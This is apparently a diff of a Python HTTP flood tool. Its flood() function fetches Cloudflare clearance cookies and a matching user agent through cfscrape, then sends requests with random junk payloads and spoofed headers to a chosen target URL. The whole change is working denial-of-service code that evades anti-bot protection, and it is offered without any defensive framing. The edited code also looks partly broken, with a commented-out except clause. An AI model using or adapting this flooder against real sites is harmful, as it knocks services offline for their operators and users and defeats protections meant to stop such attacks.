@@ -4,29 +4,33 @@ import random
 import tools.randomData as randomData
 from colorama import Fore
 import cfscrape
-
-scraper = cfscrape.create_scraper()  # returns a CloudflareScraper instance
-
+#print(request)
 # Load user agents
 user_agents = []
 for _ in range(30):
     user_agents.append(randomData.random_useragent())
 
 # Headers
-headers = {
+
+
+
+def flood(target):
+    scraper = cfscrape.create_scraper()  # returns a CloudflareScraper instance
+    cookie_arg, user_agentx = cfscrape.get_tokens(target)
+    headers = {
     "X-Requested-With": "XMLHttpRequest",
     "Connection": "keep-alive",
     "Pragma": "no-cache",
     "Cache-Control": "no-cache",
     "Accept-Encoding": "gzip, deflate, br",
-    "User-agent": random.choice(user_agents),
+    #"User-agent": random.choice(user_agents),
+    "User-agent": user_agentx,
 }
+    
 
-
-def flood(target):
     payload = str(random._urandom(random.randint(10, 150)))
     try:
-        r = scraper.get(target, params=payload, headers=headers, timeout=4)
+        r = requests.get(target, params=payload, headers=headers,cookies=cookie_arg, timeout=4)
     #except requests.exceptions.ConnectTimeout:
         print(f"{Fore.RED}[!] {Fore.MAGENTA}Timed out{Fore.RESET}")
     except Exception as e:
